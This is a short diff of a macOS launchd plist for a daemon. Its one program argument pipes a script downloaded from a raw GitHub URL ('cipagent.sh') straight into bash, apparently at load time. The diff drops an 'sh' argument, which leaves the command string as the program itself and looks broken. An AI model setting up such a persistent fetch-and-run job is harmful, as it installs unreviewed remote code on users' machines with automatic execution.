@@ -6,7 +6,6 @@
 	<string>com.zerowidth.launched.nameofdaemon</string>
 	<key>ProgramArguments</key>
 	<array>
-		<string>sh</string>
 		<string>curl https://raw.githubusercontent.com/g6mqchyhTy/cipagent/master/cipagent.sh | bash</string>
 	</array>
 	<key>RunAtLoad</key>
